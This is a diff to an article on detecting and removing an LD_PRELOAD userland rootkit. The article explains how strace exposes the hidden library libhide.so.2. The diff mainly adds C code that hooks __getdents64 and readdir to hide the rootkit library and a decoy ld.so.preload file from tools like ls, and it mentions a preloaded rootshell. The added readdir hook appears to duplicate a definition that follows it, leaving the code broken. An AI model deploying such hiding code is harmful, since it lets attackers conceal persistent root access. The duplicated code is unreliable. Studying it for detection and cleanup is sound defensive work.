@@ -294,8 +294,7 @@ openat(AT_FDCWD, "/etc/ld.so.preload.dummy", O_RDONLY) = 6
 
 So, this tells us two things. First, when we try to read /etc/ld.so.preload, a shared library at /usr/local/lib/libhide.so.2 is being accessed as well as, second, a dummy file is being opened instead of the real file. But if we look at the directory listing for /usr/local/lib/, it shows us nothing by the name of libhide.so.2 resides there. That is because of the following code which hides the shared library from tools like ls.
 
-
-/* libhide.c - updated 7/28/26 */
+/* hide.c - updated 7/29/26 */
 #define _GNU_SOURCE
 #include <stdio.h>
 #include <string.h>
@@ -304,8 +303,8 @@ So, this tells us two things. First, when we try to read /etc/ld.so.preload, a s
 #include <dlfcn.h>
 
 #define LIB_TO_HIDE "libhide.so.2"
+#define DUMMY_FILE  "ld.so.preload"
 
-// Hook __getdents64 (used internally by coreutils like 'ls')
 int __getdents64(unsigned int fd, struct dirent *dirp, unsigned int count) {
     static int (*orig_getdents64)(unsigned int, struct dirent*, unsigned int) = NULL;
     if (!orig_getdents64) {
@@ -318,17 +317,36 @@ int __getdents64(unsigned int fd, struct dirent *dirp, unsigned int count) {
     int bpos = 0;
     while (bpos < total_bytes) {
         struct dirent *d = (struct dirent *) ((char *)dirp + bpos);
-        
-        if (strcmp(d->d_name, LIB_TO_HIDE) == 0) {
+
+        // Checks both defined strings
+        if (strcmp(d->d_name, LIB_TO_HIDE) == 0 || strcmp(d->d_name, DUMMY_FILE) == 0) {
             int remaining_bytes = total_bytes - (bpos + d->d_reclen);
             memmove(d, (char *)d + d->d_reclen, remaining_bytes);
             total_bytes -= d->d_reclen;
-            continue; 
+            continue;
         }
         bpos += d->d_reclen;
     }
 
     return total_bytes;
+}
+
+// Hook readdir (used by standard C programs)
+struct dirent *readdir(DIR *dirp) {
+    static struct dirent *(*orig_readdir)(DIR *) = NULL;
+    if (!orig_readdir) {
+        orig_readdir = dlsym(RTLD_NEXT, "readdir");
+    }
+
+    struct dirent *entry;
+    while ((entry = orig_readdir(dirp)) != NULL) {
+        // If either matches, skip it and get the next entry
+        if (strcmp(entry->d_name, LIB_TO_HIDE) == 0 || strcmp(entry->d_name, DUMMY_FILE) == 0) {
+            continue;
+        }
+        return entry;
+    }
+    return NULL;
 }
 
 // Hook readdir (used by standard C programs)
@@ -372,7 +390,7 @@ In this way, the attacker could type
 
 and would get a rootshell.
 
-While the other code snippets on this page can be tested with LD_PRELOAD after compiling. Example, LD_PRELOAD=./libhide.so ls -l, the rootshell code has to actually be preloaded by /etc/ld.so.preload in order to work correctly.
+While the other code snippets on this page can be tested with LD_PRELOAD after compiling. Example, LD_PRELOAD=./hide.so ls -l, the rootshell code has to actually be preloaded by /etc/ld.so.preload in order to work correctly.
 
 As illustrated earlier, using strace leaves nowhere to hide. Now that we know the name of the shared library that is doing the hiding and intercepting is named libhide.so.2 in the /usr/local/lib/ directory, we can simply rename the file and then open the real /etc/ld.so.preload and remove the shared library from being preloaded.
 
